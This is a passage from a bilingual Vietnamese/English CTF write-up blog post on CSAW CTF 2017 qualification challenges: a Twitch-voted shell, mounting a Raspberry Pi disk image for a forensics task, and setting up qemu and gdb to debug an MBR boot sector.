</pre></table></code></div></div><h2 id="misc-twitch-100-pts">Misc: Twitch (100 pts.)</h2><p><a href="#english-twitch">English version here</a></p><h6 id="vietnamese-2">Vietnamese</h6><p>Bài này là bài bựa nhất trong cả đề. Đại khái là họ stream một cái shell lên twitch. Để điều khiển shell đó thì người xem twitch sẽ vote phím nào được ấn trên bàn phím bằng cách gõ vào phần chat. Để lấy được flag bài này thì số người đó phải exploit 1 binary bị buffer overflow. Mình thì không rảnh nhảy vào vote nên chỉ xem xong cướp flag thôi =)) Điều bựa là mỗi khi flag được lấy ra thành công thì sau vài phút, cái máy tính được stream sẽ tự động reboot và ai không lấy kịp flag thì lại ngồi chờ =)) <img data-proofer-ignore data-src="/assets/img/csaw-ctf-qualification-2017/misc100.jpg" alt="misc100" /></p><p><a name="english-twitch"></a></p><h6 id="english-2">English</h6><p>This is quite a funny challenge. All the players need to exploit a binary and the shell is streamed on twitch and controlled via a twitch chat. All the players need to vote for the character that they want to type in the shell. To get the flag, you need to be there at the right moment since the machine which contains the binary and the shell reboots whenever the flag is successfully printed out.</p><h2 id="forensics-bestrouter-200-pts">Forensics: Bestrouter (200 pts.)</h2><p>Bài này khá vớ vẩn. Download file đính kèm về giải nén ra thì ta sẽ được một file <code class="language-plaintext highlighter-rouge">.img</code>, là một file image của rasberry pi. Mình dùng lệnh sau để mount file này trên linux, từ đó sẽ đọc được dữ liệu trong file như cấu trúc của một linux filesystem thông thường:</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">sudo</span><span class="w"> </span><span class="n">mount</span><span class="w"> </span><span class="n">disk.img</span><span class="w"> </span><span class="n">.</span><span class="o">/</span><span class="n">mnt</span><span class="w">
</span></pre></table></code></div></div><p>(Lúc làm bài này mình làm theo hướng dẫn ở <a href="https://www.linuxquestions.org/questions/linux-general-1/how-to-mount-img-file-882386/#post4365399">đây</a>, thi xong mình xóa xừ nó file kia đi rồi nên không nhớ cụ thể câu lệnh là gì nữa :P )</p><p>Mở lên và truy cập vào thư mục <code class="language-plaintext highlighter-rouge">/var/www/html</code> sẽ thấy được mã nguồn của trang web cần đăng nhập: <code class="language-plaintext highlighter-rouge">http://forensics.chal.csaw.io:3287/</code> Trên windows, file này có thể được mở bằng phần mềm chuyên dụng cho forensics như Autopsy. Bài này do ngu người không để ý có cái trang web kia nên mình tìm thấy mật khẩu rồi mãi không biết dùng làm gì :D</p><h2 id="re-realism-400-pts-unsolved">RE: realism (400 pts. unsolved)</h2><p>Đây là lần đầu tiên trong 1 CTF mà mình dám động tới một bài 400. Trước khi được thông não, mình thường còn chẳng xem đề bài mấy bài này vì nghĩ chỉ có rất khủng mới làm được. Lần này khi mở lên thấy bài này hơn 30 người làm được sau ngày đầu tiên, mình nghĩ rằng đây không phải bài khó nên quyết định thử sức. Đây là một quyết định vừa đúng lại vừa có phần hơi ngu người vì làm mình bỏ lỡ mất bài pwn 200 khá ngon ăn.</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">file</span><span class="w"> </span><span class="n">main.bin</span><span class="w">
</span><span class="n">main.bin</span><span class="o">:</span><span class="w"> </span><span class="n">DOS</span><span class="o">/</span><span class="n">MBR</span><span class="w"> </span><span class="n">boot</span><span class="w"> </span><span class="n">sector</span><span class="w">
</span></pre></table></code></div></div><p>Sau một hồi tìm hiểu, mình đã chạy được file này. Kết quả ra như sau:</p><p><img data-proofer-ignore data-src="/assets/img/csaw-ctf-qualification-2017/re400-1.png" alt="QEMU-Run" /></p><p>Đây là lần đầu tiên mình reverse/debug 1 MBR. Cách cài đặt môi trường để debug như sau:</p><p>Link tham khảo: <a href="https://rwmj.wordpress.com/2011/10/12/tip-debugging-the-early-boot-process-with-qemu-and-gdb/">tip-debugging-the-early-boot-process-with-qemu-and-gdb</a></p><ol><li>Cài đặt qemu-system-i386<li>Chạy MBR và debug với GDB như sau:<li><code class="language-plaintext highlighter-rouge">qemu-system-i386 -s -S -drive format=raw,file=main.bin</code>: Lệnh này load file MBR nhưng không chạy CPU, đồng thời mở 1 gdbserver tại port 1234 ở localhost để có thể dùng gdb debug<li>Vào gdb: 1. <code class="language-plaintext highlighter-rouge">target remote localhost:1234</code>: Kết nối để gdbserver được khởi tạo ở bước trên</ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/reversing/" class="post-tag no-text-decoration" >reversing</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/radare2/" class="post-tag no-text-decoration" >radare2</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1"></span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=CSAW CTF 2017 Qualification - ret2life&url=https://ret2.life/posts/CSAW-CTF-17-Qual/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=CSAW CTF 2017 Qualification - ret2life&u=https://ret2.life/posts/CSAW-CTF-17-Qual/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=CSAW CTF 2017 Qualification - ret2life&url=https://ret2.life/posts/CSAW-CTF-17-Qual/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="" title-succeed=""> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Google-CTF-2021/">Google CTF 2021 - Fullchain</a><li><a href="/posts/CSAW-CTF-17-Qual/">CSAW CTF 2017 Qualification</a><li><a href="/posts/AceBear-CTF-19/">AceBear CTF 19</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/35C3-CTF/"><div class="card-body"> <span class="timeago small" >Dec 30, 2018<i class="unloaded">2018-12-30T11:01:14+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>35C3 CTF</h3><div class="text-muted small"><p> This is my first time participating in C3 CTF. Although I wasn’t able to solve many challenges within the time of the CTF, I still find the challenges really awesome and exciting. I wanted to solve...</p></div></div></a></div><div class="card"> <a href="/posts/TetCTF-19/"><div class="card-body"> <span class="timeago small" >Jan 1, 2019<i class="unloaded">2019-01-01T14:34:45+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TetCTF 19</h3><div class="text-muted small"><p> This is my write-up for TetCTF 19 Web - IQTest2 (unsolved) Pwn - Easy webserver (unsolved) Pwn - Babysandbox Pwn - Babyheap Pwn - Babyfirst Web IQTest2 After looking at the s...</p></div></div></a></div><div class="card"> <a href="/posts/GRIMM-HAX-Combined-Challenge/"><div class="card-body"> <span class="timeago small" >May 23, 2018<i class="unloaded">2018-05-23T03:08:38+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GRIMM HAX Combined Challenge</h3><div class="text-muted small"><p> This is the write-up for challenges I have done GRIMM HAX challenge. Welcome, Bobby (100pts) Accessing the website at http://www.haxcorp.grimm-co.com/, we are provided with a login page with us...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/UB-Lockdown-v3/" class="btn btn-outline-primary" prompt="Newer"><p>UB Lockdown V3</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Duc Phan</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4"></h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-WN0BSTHR4X"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-WN0BSTHR4X'); }); </script>
